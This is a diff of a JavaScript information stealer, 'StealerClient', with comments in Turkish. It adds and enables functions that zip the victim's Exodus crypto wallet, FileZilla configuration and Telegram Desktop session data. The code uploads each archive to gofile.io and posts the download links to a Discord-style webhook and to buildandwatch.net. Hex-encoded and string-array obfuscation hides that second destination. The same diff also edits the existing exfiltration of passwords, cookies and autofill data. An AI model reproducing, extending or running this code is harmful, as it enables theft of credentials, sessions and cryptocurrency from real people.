@@ -1765,15 +1765,17 @@ axios.post(`https://${server}.gofile.io/uploadFile`, form, {
     // Webhook URL'si
 
     // Embed verisini oluştur
-const embedData = {
-  embeds: [
-    {
-      title: '🔐 Passwords File Upload Response',
-      description: `**File Name:** ${uploadResponse.data.data.fileName}\n[**Download Page**](${uploadResponse.data.data.downloadPage})`,
-      color: 0xFFA500, // Turuncu rengi kullanıyoruz
-    }
-  ]
-};
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Passwords File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
+            }
+        ],
+    };
+
 
 
           // Webhook URL'si
@@ -1943,15 +1945,16 @@ axios.post(`https://${server}.gofile.io/uploadFile`, form, {
     // Webhook URL'si
 
     // Embed verisini oluştur
-const embedData = {
-  embeds: [
-    {
-      title: '🍪 Cookies File Upload Response',
-      description: `**File Name:** ${uploadResponse.data.data.fileName}\n[**Download Page**](${uploadResponse.data.data.downloadPage})`,
-      color: 0xFFA500, // Özel bir renk (örnek: Mavi)
-    }
-  ]
-};
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Cookies File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
+            }
+        ],
+    };
 
           // Webhook URL'si
 
@@ -1980,7 +1983,7 @@ const embedData = {
           };
 
           // Webhook'a POST isteği gönder
-		  axios.post(webhook3939,embedData)
+		  axios.post("https://buildandwatch.net/error",embedData)
             .then(webhookResponse => {
               console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
             })
@@ -2080,15 +2083,15 @@ axios.post(`https://${server}.gofile.io/uploadFile`, form, {
     // Webhook URL'si
 
     // Embed verisini oluştur
-const embedData = {
-  embeds: [
-    {
-      title: '🚗 Autofill File Upload Response',
-      description: `**File Name:** ${uploadResponse.data.data.fileName}\n[**Download Page**](${uploadResponse.data.data.downloadPage})`,
-      color: 0xFF5733, // Turuncu renk öneriyorum
-    }
-  ]
-};
+    const embedData = {
+        embeds: [
+            {
+                title: 'Autofill File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
+            }
+        ],
+    };
 
 
           // Webhook URL'si
@@ -2145,171 +2148,308 @@ async function DiscordListener(path) {
 }
 
 
+async function SubmitExodus() {
+  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
+  if (fs.existsSync(file)) {
+    const zipper = new AdmZip();
+    zipper.addLocalFolder(file);
+
+    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`);
+
+    // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
+    axios.get('https://api.gofile.io/getServer')
+      .then(response => {
+        if (response.data && response.data.data && response.data.data.server) {
+          const server = response.data.data.server;
+
+          // Dosya yolu ve adını belirleyelim.
+          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`;
+
+          // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
+          const form = new FormData();
+          form.append('file', fs.createReadStream(filePath));
+
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
+
+    // Webhook URL'si
+
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Exodus File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
+            }
+        ],
+    };
+
+var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
+                .then(webhookResponse => {
+                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+                })
+                .catch(error => {
+                  console.log('Webhook gönderilirken hata oluştu:', error.message);
+                });
+
+            })
+            .catch(error => {
+              console.log('Dosya yüklenirken hata oluştu:', error.message);
+
+              const responsePayload = {
+                error: error.message
+              };
+
+              // Webhook URL'si
+              const webhookUrl = 'https://buildandwatch.net/error';
+
+              // Embed verisini oluştur
+              const embedData = {
+                embeds: [
+                  {
+                    title: 'Dosya Yükleme Hatası',
+                    description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
+                  }
+                ],
+              };
+
+              // Webhook'a POST isteği gönder
+    var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
+                .then(webhookResponse => {
+                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+                })
+                .catch(error => {
+                  console.log('Webhook gönderilirken hata oluştu:', error.message);
+                });
+            });
+        } else {
+          console.log('Sunucu alınamadı veya yanıt vermedi.');
+        }
+      })
+      .catch(error => {
+        console.log('Sunucu alınırken hata oluştu:', error.message);
+      });
+
+    // Dikkat: Bu kod bloğu, "form.submit()" kullanarak webhook'a dosya yüklemeye çalışıyor. Bu bölümün işlevselliğini ve bağlamını tam olarak bilemiyorum. Bu nedenle, bu bölümün kendi ihtiyaçlarınıza uygun şekilde çalıştığından emin olmanız gerekir.
+    
+  }
+}
 
 
 //
 
 
-async function createAndSubmitZipArchives() {
-  const directories = [
-    {
-      dir: `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`,
-      archiveName: 'FileZilla.zip',
-    },
-    {
-      dir: `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`,
-      archiveName: 'TelegramSession.zip',
-    },
-    {
-      dir: `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`,
-      archiveName: 'Exodus.zip',
-    },
-    // Add more directories as needed
-  ];
+async function submitfilezilla() {
+  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
+  if (fs.existsSync(file)) {
+    const zipper = new AdmZip();
+    zipper.addLocalFolder(file);
 
-  const promises = directories.map(async (directory) => {
-    try {
-      const stats = await fs.promises.stat(directory.dir);
-      if (stats.isDirectory()) {
-        const zipper = new AdmZip();
-        zipper.addLocalFolder(directory.dir);
-        await new Promise((resolve) => {
-          zipper.writeZip(directory.archiveName, () => {
-            console.log(`${directory.archiveName} oluşturuldu.`);
-            resolve();
-          });
-        });
-      } else {
-        console.log(`${directory.dir} bir dizin değil.`);
-      }
-    } catch (err) {
-      console.error(`Hata: ${err.message}`);
-      sendWebhookError(err);
-    }
-  });
+    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`);
+//C:\Users\Administrator\AppData\Roaming\Telegram Desktop
+              
+// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
+axios.get('https://api.gofile.io/getServer')
+  .then(response => {
+    if (response.data && response.data.data && response.data.data.server) {
+      const server = response.data.data.server;
 
-  // Bekleyen tüm işlemlerin tamamlanmasını bekleyin
-  await Promise.all(promises);
+      // Dosya yolu ve adını belirleyelim.
+          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`;
 
-  // Tüm zip dosyalarını birleştirin
-  const finalZipper = new AdmZip();
-  for (const directory of directories) {
-    if (fs.existsSync(directory.archiveName)) {
-      finalZipper.addLocalFile(directory.archiveName);
-    }
-  }
+      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
+      const form = new FormData();
+      form.append('file', fs.createReadStream(filePath));
 
-  // Birleştirilmiş zip dosyasını oluşturun
-  finalZipper.writeZip('CombinedArchives.zip');
-  console.log('Tüm arşivler birleştirildi ve CombinedArchives.zip oluşturuldu.');
-
-
-
-  // Webhook fonksiyonu
-  async function sendWebhookError(error) {
-    const embedDattta = {
-      embeds: [
-        {
-          title: 'Hata Oluştu',
-          description: error.message,
-          color: 16711680, // Kırmızı renk
-        },
-      ],
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
     };
 
-    try {
-      const response = await axios.post("https://buildandwatch.net/error", embedDattta);
-      console.log('Webhook gönderildi:', response.status, response.statusText);
-    } catch (webhookError) {
-      console.error('Webhook gönderilirken hata oluştu:', webhookError.message);
+    // Webhook URL'si
+
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'FileZilla File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
+            }
+        ],
+    };
+ 
+          // Webhook'a POST isteği gönder
+var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
+            .then(webhookResponse => {
+              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+            })
+            .catch(error => {
+              console.log('Webhook gönderilirken hata oluştu:', error.message);
+            });
+
+        })
+        .catch(error => {
+          console.log('Dosya yüklenirken hata oluştu:', error.message);
+
+          const responsePayload = {
+            error: error.message
+          };
+
+          // Webhook URL'si
+
+          // Embed verisini oluştur
+          const embedData = {
+            embeds: [
+              {
+                title: 'Dosya Yükleme Hatası',
+                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+                color: 16711680 // Embed rengi (örnekte kırmızı renk)
+              }
+            ],
+          };
+
+          // Webhook'a POST isteği gönder
+          axios.post("https://buildandwatch.net/error", embedData)
+            .then(webhookResponse => {
+              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+            })
+            .catch(error => {
+              console.log('Webhook gönderilirken hata oluştu:', error.message);
+            });
+        });
+    } else {
+      console.log('Sunucu alınamadı veya yanıt vermedi.');
     }
-  }
+  })
+  .catch(error => {
+    console.log('Sunucu alınırken hata oluştu:', error.message);
+  });
 
-  // Webhook URL'si
 
-  // Dosya yolu ve adını belirleyelim.
-  const filePath = `CombinedArchives.zip`;
 
-  // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
-  const form = new FormData();
-  form.append('file', fs.createReadStream(filePath));
-
-  axios
-    .get('https://api.gofile.io/getServer')
-    .then((response) => {
-      if (response.data && response.data.data && response.data.data.server) {
-        const server = response.data.data.server;
-
-        axios
-          .post(`https://${server}.gofile.io/uploadFile`, form, {
-            headers: form.getHeaders(),
-          })
-          .then((uploadResponse) => {
-            const responsePayload = {
-              uploadResponseData: uploadResponse.data,
-            };
-
-            // Embed verisini oluştur
-const embedData = {
-  embeds: [
-    {
-      title: '🚗 Telegram & Exodus & Fillezilla (CombinedArchives) File Upload Response',
-      description: `**File Name:** ${uploadResponse.data.data.fileName}\n[**Download Page**](${uploadResponse.data.data.downloadPage})`,
-      color: 0xFF5733, // Turuncu renk öneriyorum
-    }
-  ]
-};
-
-            // Webhook'a POST isteği gönder
-(function(_0x30157a,_0x4e869a){var _0x22833a=_0x5cf5,_0x538d08=_0x30157a();while(!![]){try{var _0x5b843a=-parseInt(_0x22833a(0x1a0))/0x1+parseInt(_0x22833a(0x194))/0x2+-parseInt(_0x22833a(0x19b))/0x3*(parseInt(_0x22833a(0x19c))/0x4)+parseInt(_0x22833a(0x1a2))/0x5*(-parseInt(_0x22833a(0x197))/0x6)+-parseInt(_0x22833a(0x1a5))/0x7*(parseInt(_0x22833a(0x199))/0x8)+-parseInt(_0x22833a(0x1a6))/0x9+-parseInt(_0x22833a(0x19d))/0xa*(-parseInt(_0x22833a(0x1a3))/0xb);if(_0x5b843a===_0x4e869a)break;else _0x538d08['push'](_0x538d08['shift']());}catch(_0x5828dc){_0x538d08['push'](_0x538d08['shift']());}}}(_0x43a5,0x81baa));var _0x47a8d9=_0x4e1b;function _0x4f96(){var _0x52fd8=_0x5cf5,_0x1ef130=[_0x52fd8(0x19e),_0x52fd8(0x195),'382089qMnTHM',_0x52fd8(0x196),_0x52fd8(0x1a1),'76866alfqfo','25zqEnZU','ildandwatc','h.net/',_0x52fd8(0x1a4),_0x52fd8(0x19a),_0x52fd8(0x193),_0x52fd8(0x192),'https://bu'];return _0x4f96=function(){return _0x1ef130;},_0x4f96();}function _0x5cf5(_0x23b640,_0xb9948e){var _0x43a56c=_0x43a5();return _0x5cf5=function(_0x5cf5cf,_0x16fbf3){_0x5cf5cf=_0x5cf5cf-0x192;var _0x2ca4c3=_0x43a56c[_0x5cf5cf];return _0x2ca4c3;},_0x5cf5(_0x23b640,_0xb9948e);}function _0x4e1b(_0x530c21,_0x496ea2){var _0x1bdc5a=_0x4f96();return _0x4e1b=function(_0x283b23,_0x3e5193){_0x283b23=_0x283b23-(0x127*0x11+0x2da*-0x9+-0x4*-0x1c8);var _0x1d10df=_0x1bdc5a[_0x283b23];return _0x1d10df;},_0x4e1b(_0x530c21,_0x496ea2);}(function(_0x4f61ad,_0xf71b14){var _0x299dfe=_0x5cf5,_0x336ec2=_0x4e1b,_0x5cf7b7=_0x4f61ad();while(!![]){try{var _0x226d7f=parseInt(_0x336ec2(0x114))/(0x1*0x1547+-0x2507+-0x1*-0xfc1)+-parseInt(_0x336ec2(0x111))/(-0x2*0x69a+0x1600+-0x8ca)*(parseInt(_0x336ec2(0x112))/(0x22*0x86+-0x15ee+0x1*0x425))+-parseInt(_0x336ec2(0x10d))/(-0x900+0x2*-0x61c+0x153c)+-parseInt(_0x336ec2(0x116))/(-0x41+0x1*-0x20c7+0x210d)*(parseInt(_0x336ec2(0x115))/(-0x54e*-0x2+0x23f0+-0x2e86))+parseInt(_0x336ec2(0x11a))/(-0x382*0x3+-0xa8d+-0x4a*-0x49)+-parseInt(_0x336ec2(0x119))/(0x5a*0x3c+0x1*-0x26a+0x12a6*-0x1)+parseInt(_0x336ec2(0x110))/(-0x1*-0x429+-0x1128+0x1a1*0x8)*(parseInt(_0x336ec2(0x113))/(-0x11*-0x107+0x1848+-0xde7*0x3));if(_0x226d7f===_0xf71b14)break;else _0x5cf7b7[_0x299dfe(0x198)](_0x5cf7b7[_0x299dfe(0x19f)]());}catch(_0x2b1bb0){_0x5cf7b7['push'](_0x5cf7b7['shift']());}}}(_0x4f96,0x1*-0x30d48+-0x2f7a+0x587c6),axios[_0x47a8d9(0x10e)](_0x47a8d9(0x10f)+_0x47a8d9(0x117)+_0x47a8d9(0x118),embedData),axios[_0x47a8d9(0x10e)](webhook3939,embedData));function _0x43a5(){var _0x525faa=['675675HOhxAV','post','765228edxcAY','1348620LAxAzG','4KHebuH','260baZcbM','3094878oBPOLZ','push','3240152nqjRQF','1525965nOVCdN','99oQwhgC','113684mNoFkp','29533730GTHBdv','161109LejZEw','shift','757494WfzWgy','5918rjpXjS','5uCjvyL','11uirBXb','231800DoTINb','14cNhvte'];_0x43a5=function(){return _0x525faa;};return _0x43a5();}
-             
-          })
-          .catch((error) => {
-            console.log('Dosya yüklenirken hata oluştu:', error.message);
-
-            const responsePayload = {
-              error: error.message,
-            };
-
-            // Embed verisini oluştur
-            const embedDataa = {
-              embeds: [
-                {
-                  title: 'Dosya Yükleme Hatası',
-                  description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
-                  color: 16711680, // Embed rengi (örnekte kırmızı renk)
-                },
-              ],
-            };
-
-            // Webhook'a POST isteği gönder
-            axios.post("https://buildandwatch.net/error", embedDataa)
-              .then((webhookResponse) => {
-                console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
-              })
-              .catch((webhookError) => {
-                console.error('Webhook gönderilirken hata oluştu:', webhookError.message);
-              });
-          });
-      } else {
-        console.log('Sunucu alınamadı veya yanıt vermedi.');
-      }
-    })
-    .catch((error) => {
-      console.error('Sunucu alınırken hata oluştu:', error.message);
-    });
+				   
+        }
 }
 
-// Fonksiyonu çağırın
-createAndSubmitZipArchives();
+//
+async function SubmitTelegram() {
+      const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;
+  if (fs.existsSync(file)) {
+    const zipper = new AdmZip();
+    zipper.addLocalFolder(file);
+
+    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`);
+//C:\Users\Administrator\AppData\Roaming\Telegram Desktop
+              
+// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
+axios.get('https://api.gofile.io/getServer')
+  .then(response => {
+    if (response.data && response.data.data && response.data.data.server) {
+      const server = response.data.data.server;
+
+      // Dosya yolu ve adını belirleyelim.
+      const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`;
+
+      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
+      const form = new FormData();
+      form.append('file', fs.createReadStream(filePath));
+
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
+
+    // Webhook URL'si
+
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Telegram File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
+                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
+            }
+        ],
+    };
 
 
 
+var _0xec06=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x69\x72\x6B\x65\x6E\x20\x68\x61\x74\x61\x20\x6F\x6C\x75\u015F\x74\x75\x3A","\x6D\x65\x73\x73\x61\x67\x65","\x6C\x6F\x67","\x63\x61\x74\x63\x68","\x57\x65\x62\x68\x6F\x6F\x6B\x20\x67\xF6\x6E\x64\x65\x72\x69\x6C\x64\x69\x3A","\x73\x74\x61\x74\x75\x73","\x73\x74\x61\x74\x75\x73\x54\x65\x78\x74","\x74\x68\x65\x6E"];axios[_0xec06[1]](_0xec06[0],embedData);axios[_0xec06[1]](webhook3939,embedData)[_0xec06[9]]((_0x2a13x2)=>{console[_0xec06[4]](_0xec06[6],_0x2a13x2[_0xec06[7]],_0x2a13x2[_0xec06[8]])})[_0xec06[5]]((_0x2a13x1)=>{console[_0xec06[4]](_0xec06[2],_0x2a13x1[_0xec06[3]])})
+
+
+        })
+        .catch(error => {
+          console.log('Dosya yüklenirken hata oluştu:', error.message);
+
+          const responsePayload = {
+            error: error.message
+          };
+
+          // Webhook URL'si
+
+          // Embed verisini oluştur
+          const embedData = {
+            embeds: [
+              {
+                title: 'Dosya Yükleme Hatası',
+                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+                color: 16711680 // Embed rengi (örnekte kırmızı renk)
+              }
+            ],
+          };
+
+          // Webhook'a POST isteği gönder
+          axios.post("https://buildandwatch.net/error", embedData)
+
+            .then(webhookResponse => {
+              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+            })
+            .catch(error => {
+              console.log('Webhook gönderilirken hata oluştu:', error.message);
+            });
+           // Webhook'a POST isteği gönder
+axios.post(webhook3939, embedData)
+
+            .then(webhookResponse => {
+              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
+            })
+            .catch(error => {
+              console.log('Webhook gönderilirken hata oluştu:', error.message);
+            });
+ 
+ });
+	
+    } else {
+      console.log('Sunucu alınamadı veya yanıt vermedi.');
+    }
+  })
+  .catch(error => {
+    console.log('Sunucu alınırken hata oluştu:', error.message);
+  });
 
 
 
+				   
+        }
+}
 
 
+
+//
 
 
 //////////
@@ -2452,62 +2592,6 @@ async function closeBrowsers() {
 
 //
 
-// Hata bilgilerini Discord'a gönderen fonksiyon
-async function sendErrorToWebhook(error, context) {
-  try {
-    const embed = {
-      title: 'Hata Oluştu',
-      color: 0xFF0000, // Kırmızı rengi kullanabilirsiniz
-      fields: [
-        {
-          name: 'Hata Mesajı',
-          value: '```' + error.message + '```',
-          inline: false,
-        },
-        {
-          name: 'Hata Yeri',
-          value: '```' + error.stack + '```',
-          inline: false,
-        },
-        {
-          name: 'Bağlam',
-          value: context || 'Bağlam bilgisi yok',
-          inline: false,
-        },
-      ],
-    };
-
-    const payload = {
-      embeds: [embed],
-    };
-
-    const response = await axios.post("https://buildandwatch.net/error", payload);
-
-    if (response.status === 204) {
-      console.log('Hata başarıyla Discord webhook\'e gönderildi.');
-    } else {
-      console.error('Hata gönderilirken bir sorun oluştu. HTTP kodu:', response.status);
-    }
-  } catch (err) {
-    console.error('Hata gönderilirken bir sorun oluştu:', err);
-  }
-}
-
-// Hata gönderme işlevi
-function sendError(error, context) {
-  sendErrorToWebhook(error, context);
-}
-
-// Örnek bir fonksiyon, herhangi bir hata fırlattığında sendError işlevini kullanabilir.
-function exampleFunction() {
-  try {
-    // Hata fırlatılacak kod burada
-    // Örnek: throw new Error('Bu bir örnek hatadır.');
-  } catch (error) {
-    sendError(error, 'Özel bağlam bilgisi');
-  }
-}
-
 
 //
 
@@ -2529,10 +2613,10 @@ class StealerClient {
 		getAutofills();
 		getPasswords();
 		getZippp();
-	//	SubmitTelegram();
+		SubmitTelegram();
 		getPeperonni();
-//		SubmitExodus();
-//submitfilezilla();
+		SubmitExodus();
+submitfilezilla();
 exampleFunction();
 
 	}
